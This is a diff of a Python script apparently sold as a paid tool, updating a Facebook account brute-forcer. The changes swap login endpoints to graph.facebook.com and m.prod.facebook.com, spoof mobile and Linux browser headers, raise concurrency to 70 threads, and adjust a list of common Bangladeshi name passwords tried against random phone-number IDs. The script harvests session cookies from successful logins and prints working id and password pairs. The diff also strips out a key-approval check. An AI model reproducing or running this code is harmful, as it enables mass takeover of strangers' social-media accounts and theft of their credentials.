@@ -327,7 +327,7 @@ logo = (f"""
 \x1b[1;92m{XX}[\x1b[1;92m={XX}] \x1b[38;5;47mFACEBOOK  \x1b[1;97m ● \x1b[1;92mRAHAT RAZ  
 \x1b[1;92m{XX}[\x1b[1;92m={XX}] \x1b[38;5;48mGITHUB    \x1b[1;97m ● \x1b[1;92mRAHAT-RAZ
 \x1b[1;92m{XX}[\x1b[1;92m={XX}] \x1b[38;5;47mTOOLS     \x1b[1;97m ● \x1b[1;92mPAID
-\x1b[1;92m{XX}[\x1b[1;92m={XX}] \x1b[38;5;47mVERSION   \x1b[1;97m ● \x1b[1;92m0.2                   
+\x1b[1;92m{XX}[\x1b[1;92m={XX}] \x1b[38;5;47mVERSION   \x1b[1;97m ● \x1b[1;92m4.5                   
 {GGG}\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}""")
 def linex():
         print(f'{GGG}\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}')
@@ -609,7 +609,7 @@ def api2(ids,names,passlist):
 'Accept-Encoding': 'gzip, deflate',
 'X-FB-Connection-Type': 'MOBILE.LTE',
 'Content-Type': 'application/x-www-form-urlencoded'}
-                        url = 'https://b-api.facebook.com/auth/login'
+                        url = 'https://graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
                                         print(f'\r\r\033[1;31m [\033[1;32mRAZ-OK\033[1;31m]\033[1;32m '+ids+' \033[1;31m● \033[1;32m'+pas+'\033[1;97m')
@@ -651,29 +651,31 @@ def ffb(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'x.facebook.com',
+                        head = {'Host': 'm.prod.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=Fj1KZilpKNWBBcBMRFyclER1; sb=Fj1KZrOa5OvUNDAqObyIt_iG; m_pixel_ratio=2.106250047683716; wd=513x1061; fr=00eTXbcifP3axnFxL..BmSj0W..AAA.0.0.BmSj1S.AWUVeaZy4is',
-    'dpr': '2.106250047683716',
-    'sec-ch-prefers-color-scheme': 'dark',
+    # 'cookie': 'sb=i6xJZg8BZel3P8fWYulYNgsM; m_pixel_ratio=3.2983407974243164; datr=jlhLZggX89YlOH56zFHf04zp; wd=891x1644; fr=0INxKh6sCZ5jCKhYJ.AWU2qKeqBNOTe3ME-37oy0BexBs.BmSV4K..AAA.0.0.BmS1i1.AWXIFNP8Hm4',
+    'dpr': '3',
+    'referer': 'https://m.prod.facebook.com/',
+    'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Infinix X6812"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': ua,
-    'viewport-width': '980',}
-                        getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+    'viewport-width': '980',
+}
+                        getlog = session.get(f'https://m.prod.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://x.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        complete = session.post(f'https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Aws=session.cookies.get_dict().keys()
                         if "c_user" in Aws:
                                 coki=session.cookies.get_dict()
@@ -715,24 +717,21 @@ def rimon(ids,names,passlist):
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
                         head = {'Host': 'p.facebook.com',
+    'authority': 'p.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'dpr': '2.106250047683716',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Infinix X6812"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
+    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'cookie': 'datr=5bQqZvi7vy2NRwoMfL1onSni; sb=ORUrZosaWRC_APjqeRHjg6r4; m_pixel_ratio=3.2983407974243164; wd=891x1644; fr=0pX1iNyGCxhGCOpEB.AWUk0sikzcjN-8QWWzHyYrAhm5o.BmKrTl..AAA.0.0.BmS1XA.AWWd0S_RiW4',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': ua,
-    'viewport-width': '980',}
+    'viewport-width': '980',
+}
                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -818,7 +817,7 @@ def RANDOMBD():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with tred(max_workers=60) as rimon:
+    with tred(max_workers=70) as rimon:
         os.system('clear')
         print(logo)
         tl = str(len(user))
@@ -828,7 +827,7 @@ def RANDOMBD():
         print(f'\x1b[1;92m{XX}[\x1b[1;92m={XX}]\x1b[38;5;46m FIRST \033[1;37m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;37m] \033[1;92mAIRPLANE MODE \x1b[1;92m{XX}]')
         linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'mehedi','mababa','sumaiya','saiful','jannatul','Fatema','farjana','sabbir','humaira','alamin','mimmim','hridoy','fariya','shakil','mafiya','habiba','free fire','i love you','sadiya','nusrat','Bangla','gaming','tamanna','১২৩৪৫৬']
+            pwx = [love[2:],love,code+love,code+love[:3],'mehedi','mababa','sumaiya','saiful','jannatul','Fatema','farjana','sabbir','fariya','free fire','i love you','sadiya','nusrat','Bangla','gaming','tamanna','১২৩৪৫৬']
             ids = code+love
             if mthdx in ['1','1']:
             	rimon.submit(FIRE,ids,pwx,tl)
@@ -862,7 +861,7 @@ def RANDOMIN():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with tred(max_workers=60) as rimon:
+    with tred(max_workers=70) as rimon:
         os.system('clear')
         print(logo)
         tl = str(len(user))
@@ -1068,27 +1067,5 @@ def M3Z(ids,pwx,tl):
     except:
         pass        
         pass
-def aprove():
-    a=str(os.getuid())
-    print(f"\33[1;92m[\33[1;97m√\33[1;92m]\x1b[38;5;46m APPROVED SUCCESSFUL")
-    b=str(os.getlogin())
-    key="".join(a+b)
-    httpCaht = requests.get('https://github.com/Sharif489/Appruval/blob/main/Appruval.txt').text    
-    if key in httpCaht:
-        menu_a()
-    else:
-        os.system("clear")
-        print(logo)
-        print(f"{G1}[{A}√{G1}]{G1} YOUR KEY {A}: {S}RAHAT"+key+"RAZ")
-        linex()
-        print(f"{G1}[{A}√{G1}] {G1}NOTE !")
-        print(f"{G1}[{A}√{G1}] {G1}THIS IS PAID TOOL ")
-        print(f"{G1}[{A}√{G1}] {G1}SEND YOUR KEY ADMIN ")
-        print(f"{G1}[{A}√{G1}] {G1}CONTACT BBC ADMIN ")
-        linex()
-        input(f"{G1}[{A}√{G1}]{G1} IF U WANT TO BUY THEN PRESS ENTER ")
-        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+key);os.system('am start https://wa.me/+8801332799658?text='+tks)
-        sys.exit()
 
-aprove()        
 menu_a()                   
